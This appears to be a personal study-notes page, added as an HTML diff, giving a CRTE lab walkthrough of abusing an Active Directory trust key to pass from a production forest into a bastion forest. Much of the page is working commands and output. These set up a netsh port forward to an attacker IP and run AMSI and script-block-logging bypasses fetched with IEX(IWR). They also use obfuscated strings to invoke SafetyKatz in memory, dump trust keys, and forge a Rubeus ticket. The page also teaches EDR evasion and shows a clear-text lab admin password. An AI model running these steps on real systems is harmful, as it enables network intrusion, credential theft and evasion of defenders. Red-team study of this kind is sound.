@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTE Part 34 - Cross Forest Attacks - Trusting to Trusted - Trust Key | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+    }
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+    }
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    .goad-content ul, .goad-content ol {
+      margin: 20px 0;
+      padding-left: 30px;
+    }
+    .goad-content li {
+      color: var(--light-gray);
+      margin-bottom: 10px;
+      font-size: 20px;
+      line-height: 1.8;
+    }
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    .goad-content blockquote {
+      border-left: 4px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray-70);
+    }
+    .goad-content hr {
+      border: none;
+      border-top: 1px solid var(--jet);
+      margin: 40px 0;
+    }
+    .part-navigation {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 50px;
+      padding-top: 30px;
+      border-top: 1px solid var(--jet);
+    }
+    .part-navigation a {
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .part-navigation a:hover {
+      text-decoration: underline;
+    }
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      padding: 5px 0;
+      transition: color 0.25s ease;
+    }
+    .goad-sidebar-list a:hover {
+      color: var(--orange-yellow-crayola);
+    }
+    .back-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
+        <ul class="goad-sidebar-list">
+<li><a href="part-01-introduction.html">Part 1: Introduction</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li>
+<li><a href="part-03-privilege-escalation.html">Part 3: Privilege Escalation</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting attack</a></li>
+<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Privilege Escalation - Targeted Ker...</a></li>
+<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Privilege Escalation - LAPS (Local ...</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Dumping LSASS Credentials</a></li>
+<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: LSASS Attack With MDE Bypass</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Pass The Certificates Attack</a></li>
+<li><a href="part-11-privilege-escalation-unconstrained-delegation.html">Part 11: Privilege Escalation - Unconstraine...</a></li>
+<li><a href="part-12-privilege-escalation-constrained-delegation.html">Part 12: Privilege Escalation - Constrained ...</a></li>
+<li><a href="part-13-privilege-escalation-rbcdresource-based-constraine.html">Part 13: Privilege Escalation - RBCD(Resourc...</a></li>
+<li><a href="part-14-domain-persistence-golden-ticket-attack.html">Part 14: Domain Persistence - Golden Ticket ...</a></li>
+<li><a href="part-15-domain-persistence-silver-ticket-attack.html">Part 15: Domain Persistence - Silver Ticket ...</a></li>
+<li><a href="part-16-domain-persistence-diamond-ticket-attack.html">Part 16: Domain Persistence - Diamond Ticket...</a></li>
+<li><a href="part-17-domain-persistence-skeleton-key-attack.html">Part 17: Domain Persistence - Skeleton Key A...</a></li>
+<li><a href="part-18-domain-persistence-sapphire-ticket-attack.html">Part 18: Domain Persistence - Sapphire Ticke...</a></li>
+<li><a href="part-19-domain-persistence-adminsdholder-attack.html">Part 19: Domain Persistence - AdminSDHolder ...</a></li>
+<li><a href="part-20-cross-domain-attacks-active-directory-certificate.html">Part 20: Cross Domain Attacks - Active Direc...</a></li>
+<li><a href="part-21-shadow-credentials-abusing-user-object.html">Part 21: Shadow Credentials - Abusing User O...</a></li>
+<li><a href="part-22-cross-domain-attacks-unconstrained-delegation-to-e.html">Part 22: Cross Domain Attacks - Unconstraine...</a></li>
+<li><a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html">Part 23: Cross Domain Attacks - Attacking Az...</a></li>
+<li><a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 24: Cross Domain attacks - Child To For...</a></li>
+<li><a href="part-25-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 25: Cross Domain attacks - Child To For...</a></li>
+<li><a href="part-26-cross-forest-attacks-kerberoast-attack.html">Part 26: Cross Forest Attacks - Kerberoast A...</a></li>
+<li><a href="part-27-cross-forest-attacks-constrained-delegation-with-p.html">Part 27: Cross Forest Attacks - Constrained ...</a></li>
+<li><a href="part-28-cross-forest-attacks-unconstrained-delegation.html">Part 28: Cross Forest Attacks - Unconstraine...</a></li>
+<li><a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html">Part 29: Cross Forest Attacks - Trust Key Ab...</a></li>
+<li><a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Part 30: Cross Forest Attacks - Injecting SI...</a></li>
+<li><a href="part-31-trust-abuse-mssql-servers-database-links.html">Part 31: Trust Abuse - MSSQL Servers - Datab...</a></li>
+<li><a href="part-32-cross-forest-attacks-foreign-security-principals-a.html">Part 32: Cross Forest Attacks - Foreign Secu...</a></li>
+<li><a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html">Part 33: Cross Forest Attacks - Abusing PAM(...</a></li>
+<li><a href="part-34-cross-forest-attacks-trusting-to-trusted-trust-key.html" style="color: var(--orange-yellow-crayola);">Part 34: Cross Forest Attacks - Trusting to ...</a></li>
+<li><a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Part 35: Cross Forest Attacks - Abusing Trus...</a></li>
+        </ul>
+        <div class="separator"></div>
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <div class="goad-content">
+<h1>CRTE - Certified Red Team Expert</h1>
+
+<h2>Cross Forest Attacks - Trusting to Trusted - Trust Key</h2>
+
+Before we exploit Trust Keys to move from a trusting forest (production) to a trusted forest (bastion), we need to understand how trust relationships work and why this attack breaks the intended security model.
+When two forests establish a trust, they create a trust account, which acts as a secure channel for authentication requests. This trust account exists in both forests and holds a shared secret known as the trust key. The trust key is a cryptographic secret used to encrypt authentication traffic between forests, ensuring that users from one forest can authenticate in the other without exposing their actual credentials.
+In a Privileged Access Management (PAM) setup, the bastion forest is the trusted forest, and the production forest is the trusting forest. This means that authentication should only flow in one direction: administrators in bastion.local can elevate their privileges inside production.local, but not the other way around. The system is designed this way to prevent compromised production environments from affecting high-security bastion forests. However, if we compromise the production forest, we can extract the trust key and forge authentication requests to infiltrate bastion.local, effectively reversing the flow of access.
+<h3>Exploiting the Trust Key to Move from Trusting to Trusted</h3>
+
+Since we control the production forest, our objective is to leverage the trust key to authenticate inside the bastion forest. This attack works because the trust key is symmetrical, meaning both forests can validate authentication requests using the same secret. Microsoft’s default configuration does not prevent authentication from flowing in the reverse direction, making this an effective method for breaking PAM security boundaries.
+To execute the attack, we first need to extract the trust key from production.local’s Domain Controller. The trust key is stored as an NTLM hash inside Active Directory, and we can retrieve it using a DCSync attack with mimikatz or SafetyKatz. This attack allows us to request the trust account’s password hash without needing direct access to the bastion forest’s DC. Once we have the trust key, we can use it to forge a Ticket Granting Ticket (TGT) for the trust account.
+With the forged TGT, we request authentication inside bastion.local. The key to this step is that we must use the trust key from the correct direction, meaning the trust key from bastion to production. Since the bastion forest recognizes the trust account as a valid entity, it allows us to authenticate using the forged TGT, effectively giving us a foothold inside the bastion forest.
+This technique is particularly dangerous because it does not require us to compromise any user credentials inside bastion.local. Instead, we abuse a default trust configuration that allows authentication requests to flow bidirectionally. By leveraging the trust key, we become a trusted entity inside bastion.local, allowing us to escalate further.
+<h3>Privilege Escalation Inside the Bastion Forest</h3>
+
+Once we gain initial access inside bastion.local, we shift our focus to privilege escalation. The trust account we used for authentication is a domain user inside bastion.local, meaning it may have access to shared resources, Kerberos tickets, or even privileged delegation paths.
+One of the fastest ways to escalate privileges is through Kerberos delegation abuse. If the trust account is configured with unconstrained delegation, we can capture TGTs of privileged users when they authenticate to the compromised system. If resource-based constrained delegation (RBCD) is in use, we can modify delegation settings to impersonate an Enterprise Admin inside bastion.local.
+Another powerful method is SID history injection. If SID filtering is disabled, we can inject a bastion.local privileged SID into our authentication token, effectively granting us Domain Admin or Enterprise Admin rights inside the bastion forest.
+Additionally, if the bastion domain controllers allow DCSync operations, we can perform another DCSync attack to extract all NTLM hashes for bastion.local, giving us complete control over the bastion environment.
+<h3>Why This Attack Is Devastating</h3>
+
+<p>This attack is critical because it completely bypasses the intended security model of PAM Trusts. By default, privileged access should never flow from production to bastion, but by abusing the trust key, we force authentication to work in the opposite direction. This means that even if an organization has implemented Privileged Access Management, an attacker can still escalate into the most secure part of the environment simply by leveraging a default setting that allows trust keys to be used bidirectionally.
+Once we establish full control over bastion.local, we can compromise all privileged accounts, modify trust settings, and set up persistent access to ensure that even if defenders detect the intrusion, we maintain control over the environment.
+This method of moving from a trusting forest (production) to a trusted forest (bastion) using the trust key is one of the most effective cross-forest attack techniques because it requires no additional misconfigurations beyond the default trust setup. By extracting the trust key, forging Kerberos tickets, and abusing delegation, we break the security boundary between forests, leading to full administrative control over an environment that was never meant to be accessible from a lower-privileged forest.</p>
+
+<p>Let’s assume that we have compromised a Production(Users) Forest already and our main idea is to compromise a Bastion(Admin) Forest. We are on our compromised target and we decided to do some enumeration and from this enumeration we were able to find a doc file containing several credentials for example.</p>
+
+<h1>Enumeration Phase </h1>
+
+Let’s assume that we have compromised a Production(Users) Forest already and our main idea is to compromise a Bastion(Admin) Forest. We are on our compromised target and we decided to do some enumeration and from this enumeration we were able to find a doc file containing several credentials for example.
+InvisiShell is a tool designed to bypass security controls in PowerShell, allowing for the stealthy execution of scripts by circumventing enhanced logging mechanisms and detection by security software.
+Here’s a detailed explanation of how InvisiShell works:
+<ul>
+<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI).</li>
+</ul>
+These are security features that Microsoft implemented to monitor and log PowerShell activity.
+<ul>
+<li>Hooking .NET Assemblies: InvisiShell achieves its bypass by hooking into the .NET assemblies System.Management.Automation.dll and System.Core.dll.</li>
+<li>Methods of Use: InvisiShell can be launched in two ways, depending on the user's privileges:</li>
+<li>Incapacitating Security Features: By hooking into these .NET assemblies, InvisiShell disables system-wide transcription, AMSI, and script block logging for the current PowerShell session.</li>
+<li>Avoiding Detection: When using InvisiShell, the tool hooks to System.Management.Automation.dll and System.Core.dll, which allows it to avoid system-wide transcription, script block logging, and AMSI.</li>
+<li>Integration with Other Tools: The sources show that InvisiShell can be used in conjunction with other tools, such as PowerUp, PowerView, the AD module, and other PowerShell scripts.</li>
+<li>Clean-up Process: To complete the clean-up, users must type exit in the new PowerShell session created by InvisiShell.</li>
+<li>Modified Version: The class uses a slightly modified version of InvisiShell.</li>
+<li>Location of Tools: All the tools, including InvisiShell, used in the lab environment are located in the C:\AD\tools directory on the student VM. The lab manual also notes that this directory is exempted from Windows Defender, but AMSI may still detect some tools when loaded.</li>
+<li>InvisiShell and Binaries: It is noted that binaries like Rubeus.exe may be inconsistent when used from within an InvisiShell session and should be run from a normal command prompt.</li>
+<li>Example Usage: The lab manual provides examples of using InvisiShell to launch a PowerShell session, import modules, and run commands to exploit a service, bypass AMSI, and extract credentials from a remote machine.</li>
+</ul>
+In summary, InvisiShell is essential for maintaining stealth in the lab environment by allowing the user to execute PowerShell scripts without triggering the enhanced logging and security features of Windows. The tool is used to bypass security controls in PowerShell, specifically designed to circumvent enhanced logging mechanisms and detection by security software.
+.\RunWithRegistryNonAdmin.bat
+<img src="./images/screenshot_470.png" alt="">
+
+<h1>Portforwarding to bypass EDR</h1>
+
+What If we simply download and execute the files in memory on the target machine?
+We could simply download file by calling it straight from our attacking IP, but we would easily be caught by Defender or any sort of defense mechanism in place on our network.
+<h3>Let’s highlights the importance of my statement above.</h3>
+
+<p>Evading detection by security tools when performing actions such as credential dumping with tools like SafetyKatz can be a trigger to compromise all our Red Team operation and let me tell you why.
+<ul>
+<li>Direct Execution is Easily Detected: Running tools like SafetyKatz or any other file directly from an attacker's IP address makes it easy for security tools to detect the activity. Security mechanisms, such as Windows Defender and Microsoft Defender for Endpoint (MDE), are designed to identify known malicious tools, their signatures, and their behaviors.</li>
+<li>Network Traffic Monitoring: When Rubeus is executed from an external IP, it generates network traffic that can be monitored and flagged by security tools.</li>
+<li>LSASS Process Access is a Red Flag: Tools like SafetyKatz attempt to access the LSASS process to extract credentials from memory. This is a highly suspicious activity that will easily be detected and is a major indicator of a malicious attack.</li>
+<li>Bypassing Detection Mechanisms: To avoid detection, attackers need to implement various bypass techniques, including:</li>
+</ul>
+In summary, running files directly from an attacking IP is highly likely to be detected by most modern security tools. Therefore, attackers use advanced techniques like obfuscation, memory loading, process injection, and port forwarding to evade detection. The course material emphasizes these techniques in order to learn about these types of attacks and to improve red team Opsec.</p>
+
+To avoid being caught by any defensive mechanism, we can  simply create a PortForwarding on the target machine then call any file that we want using it’s localhost IP.
+NOTE: We are using cmd.exe /c " " inside PowerShell because netsh interface portproxy does not execute properly in native PowerShell. Some legacy Windows commands, including netsh, have compatibility issues when run directly in PowerShell due to differences in how arguments are parsed.
+By wrapping the command in cmd.exe /c " ", we force PowerShell to execute it in a cmd.exe shell, ensuring that netsh correctly processes our arguments. This helps us avoid any syntax misinterpretations that PowerShell might introduce when handling spaces, equal signs, or special characters.
+cmd.exe /c "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.100.163"
+<img src="./images/screenshot_471.png" alt="">
+
+netsh interface portproxy add v4tov4:
+<ul>
+<li>netsh interface portproxy: This is the part of the netsh utility that deals with port forwarding. It allows forwarding TCP traffic from one IP/port combination to another.</li>
+<li>add: Specifies that you're adding a new forwarding rule.</li>
+<li>v4tov4: Indicates that both the listening and connecting addresses use IPv4.</li>
+</ul>
+<h3>2. listenport=8080:</h3>
+
+<ul>
+<li>The port on the local machine (target machine) where the service will "listen" for incoming connections.</li>
+<li>In this case, the machine will listen on port 8080.</li>
+</ul>
+<h3>3. listenaddress=127.0.0.1:</h3>
+
+<ul>
+<li>The IP address on the local machine where the service will listen for connections.</li>
+<li>0.0.0.0 means it will listen on all network interfaces available on the machine (e.g., public, private, or loopback IPs).</li>
+</ul>
+<h3>4. connectport=80:</h3>
+
+<ul>
+<li>The port on the remote machine (Out Attacking Machine) to which traffic will be forwarded.</li>
+<li>In this case, port 80 (commonly used for HTTP).</li>
+</ul>
+<h3>5. connectaddress=192.168.100.163:</h3>
+
+<ul>
+<li>The IP address of the remote machine (Our Attacking Machine).</li>
+</ul>
+This port forwarding setup redirects traffic received on port 8080 from our compromised machine to port 80 on our attacking machine (192.168.100.163),  which acts as a bridge. We can check this portforwarding with the following command.
+cmd.exe /c "netsh interface portproxy show all"
+<img src="./images/screenshot_472.png" alt="">
+
+<h2>Hosting files on Attacking Host</h2>
+
+We should be hosting our files in our attacking host. This will be requested by our Target.
+<img src="./images/screenshot_473.png" alt="">
+
+<h3>Disabling Defender</h3>
+
+Before we carry on with our target host, we need to disable our firewall on our side. This way we can host the file on our machine with no issues, without having the firewall complaining.
+<img src="./images/screenshot_474.png" alt="">
+
+Now that we do have all setup, let’s get our Powershell defense mechanism like Script Block Logging and AMSI bypassed, and we will accomplish this by requesting fileless and executing it into the memory straightforward once requested.
+Remeber, our request to any file here will be made via 127.0.0.1 which is out local IP because we have configured the PortForwarding using netsh by pointing that all the requests done to 127.0.0.1 on port 8080 to be redirected to our attacking IP 192.168.100.163 on port 80.
+The following commnd will be requesting 2 files, one to bypass Script Block Logging and the other to bypass AMSI.
+IEX(IWR http://127.0.0.1:8080/sbloggingbypass.txt -UseBasicParsing); IEX(IWR http://127.0.0.1:8080/amsibypass.txt -UseBasicParsing)
+<img src="./images/screenshot_475.png" alt="">
+
+Now that we were able to to bypass Powershell defense mechanism, let’s do some enumeration. Assuming that we were able find some valid clear-text credentials during our enumeration.
+<img src="./images/screenshot_476.png" alt="">
+
+In this script we ended up finding out the production.local Domain Administrator clear-text passwordProductivityMatters@2048Gigs and functionality to test CredSSP authentication.
+Because this file name and script itself refer to CredSSP, we can check if CredSSP has been enabled on our target.
+Get-WSManCredSSP
+<img src="./images/screenshot_477.png" alt="">
+
+<p>We can see that CredSSP has been configured on production.local. 
+Since CredSSP has been setup on the target we can check to see if the CredSSP client is enabled locally on our attacking machine to gain a PSRemote session onto production-dc bypassing the Kerberos double hop. We will be using Get-ItemProperty for that.</p>
+
+Finally check settings using PowerShell (admin) to see if CredSSP client authentication and Trusted Hosts are set, we find that they are enabled and configured by checking the Registry Key for that.
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client" -Name "AllowCredSSP"
+<img src="./images/screenshot_478.png" alt="">
+
+We can see above that, CredSSP client authentication has been configured.
+It is also possible to confirm that Trusted Hosts are set to everyone by issue the following command as well.
+Get-Item WSMan:\localhost\Client\TrustedHosts
+<img src="./images/screenshot_479.png" alt="">
+
+<p>Currently we have Value = <em> because we are trusting everyone. This is not the best setup, but for labbing purpose its OK.</p>
+
+Now we can get access to production.local Domain Controller as Domain Administrator and we will be doing this by using PowerShell Remoting to avoid double hop.
+$password = ConvertTo-SecureString 'ProductivityMatters@2048Gigs' -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential('production\administrator', $Password)
+$session = New-PSSession -cn production-dc.production.local -Credential $credential -Authentication Credssp
+Enter-PSSession -Session $session
+<img src="./images/screenshot_480.png" alt="">
+
+<p>As we can see now, we were able to access the production.local Domain Controller as Domain Admin.
+Now that we have a new session as Domain admin in production.local, we need to once again bypass Script Block Logging and AMSI and we will do it again by requesting fileless and running into the memory.
+IEX(IWR http://127.0.0.1:8080/sbloggingbypass.txt -UseBasicParsing); IEX(IWR http://127.0.0.1:8080/amsibypass.txt -UseBasicParsing)
+After this bypass let’s download Loader onto the target and leverage SafetyKatz and netsh as before to extract the trust key [out] for bastion-dc.
+wget http://127.0.0.1:8080/Loader.exe -o C:\Users\Public\Loader.exe</p>
+
+OPSEC Alert: Next execution is performed under PowerShell rather than native cmd here to leverage CredSSP and bypass double hop issues.
+<pre><code class="language-bash">$z="t"
+$y="s"
+$x="u"
+$w="r"
+$v="t"
+$u=":"
+$t=":"
+$s="p"
+$r="m"
+$q="u"
+$p="d"
+$o="a"
+$n="s"
+$m="l"
+$Pwn=$m + $n + $o + $p + $q + $r + $s + $t + $u + $v + $w + $x + $y + $z
+</code></pre>
+
+<img src="./images/screenshot_481.png" alt="">
+
+Let’s now use SafetyKatz and dump the Trust Key between [OUT]  Bastion.local → Production.local.
+C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "$Pwn /patch" "exit"
+<img src="./images/screenshot_482.png" alt="">
+
+<pre><code class="language-bash">Domain: BASTION.LOCAL (BASTION / S-1-5-21-284138346-1733301406-1958478260)
+ [  In ] PRODUCTION.LOCAL -&gt; BASTION.LOCAL
+
+[ Out ] BASTION.LOCAL -&gt; PRODUCTION.LOCAL
+    </em> 2/24/2025 9:04:32 PM - CLEAR   - 29 09 c3 19 5f 8c c4 ce 84 e5 8e 83 6f b8 b8 fc 28 0d c8 86 20 25 b8 34 24 05 cf 8b 7c 2b fe 31 39 ec 47 53 3c 32 7c 65 7b 1a fd 6d 10 9f f0 48 fb 7b 2f e7 4b 50 0d d5 59 3c f2 ce 79 42 fc 0f 4e 53 4c 8d 9e 48 fc 84 f3 23 c3 ad c4 a3 f7 6c 41 fc a7 71 91 d3 02 f9 98 db bd 8c 6b 9b a8 0f 94 81 01 af d0 b1 12 2b 0e 5d 6a 87 7d 7c 18 0a 25 74 df b3 95 9a 7b 47 f5 6e 37 27 ef 7c f3 61 99 87 22 c0 dc 58 69 ba 49 3a 57 d2 06 a8 27 9e 09 f7 4c b5 9d b2 57 12 62 1e 19 84 53 47 d2 96 7d 53 8b 4e 9f 81 76 b9 c5 49 5b 6a 9d 9b ff 5e 24 ab ca b9 4d 26 aa b3 32 f0 3a a0 be 8e 11 53 f8 71 ab af d7 ed 2c e2 91 f2 b5 32 aa 7e c8 f7 e4 e7 67 e3 9e dc 35 be 9a b1 46 c0 b2 23 d5 6b 24 5f f4 7a 89 60 13 63 b8 d5 82 ae 49 b9 97 c7
+        <em> aes256_hmac       600a93e9fc91486a4987f089561df32feb2c841f0f6613767d1c98f6717be365
+        </em> aes128_hmac       cdd811998ef3e7e1be93bbbf09f07687
+        * rc4_hmac_nt       d19236bd54b3041b4fdfc2987b21f4c2
+</code></pre>
+
+From the current context, we have successfully extracted the Trust Key between bastion.local and production.local using SafetyKatz. This key allows us to forge authentication requests between the two forests, effectively breaking the expected security boundary. The output confirms that we retrieved aes256_hmac, aes128_hmac, and rc4_hmac_nt keys, which are used to encrypt authentication tickets. Specifically, we obtained the trust key for the direction Bastion → Production, meaning we can now leverage it to authenticate as PRODUCTION$ inside bastion.local.
+Now that we have extracted the trust key, our next step is to request a TGT (Ticket Granting Ticket) for PRODUCTION$ inside bastion.local and perform Pass-the-Ticket (PTT) to authenticate seamlessly. Using Rubeus, we issue an asktgt request with the RC4 trust key to obtain a valid Kerberos ticket for PRODUCTION$ in bastion.local. 
+We must once again encode the Rubeus Argument(asktgt) and copy/paste it into our PowerShell session as Administrator producation.local.
+<pre><code class="language-bash">$z="t"
+$y="g"
+$x="t"
+$w="k"
+$v="s"
+$u="a"
+$Pwn=$u + $v + $w + $x + $y + $z
+</code></pre>
+
+<img src="./images/screenshot_483.png" alt="">
+
+The /ptt flag allows us to directly inject this TGT into our session, meaning we can now authenticate as PRODUCTION$ without needing explicit credentials.
+C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args $Pwn /user:production$ /domain:bastion.local /aes256:600a93e9fc91486a4987f089561df32feb2c841f0f6613767d1c98f6717be365 /dc:bastion-dc.bastion.local /nowrap /ptt
+<img src="./images/screenshot_484.png" alt="">
+
+This method effectively bypasses intended PAM security controls, proving that trust keys can be abused to move from a trusting to a trusted forest, breaking the assumed security isolation. Now that we have access to bastion.local, our next objective is to escalate privileges within the bastion forest to gain full control.
+Since CredSSP is used we can bypass the double hop for ticket imports / AD authentication and other actions that require some form of delegation. If we check klist tickets, we are able to find the ticket injected.
+klist
+<img src="./images/screenshot_485.png" alt="">
+
+We can finelly access the bastion-dc.bastion.local our Bastion (Admin) Forest. Let’s do a Net View command and see what we can access inside Bastion-DC.
+net view \\bastion-dc.bastion.local
+<img src="./images/screenshot_486.png" alt="">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="part-navigation">
+            <a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Abusing</a>
+            <a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Next: Cross Forest Attacks - Abusing <ion-icon name="arrow-forward-outline"></ion-icon></a>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
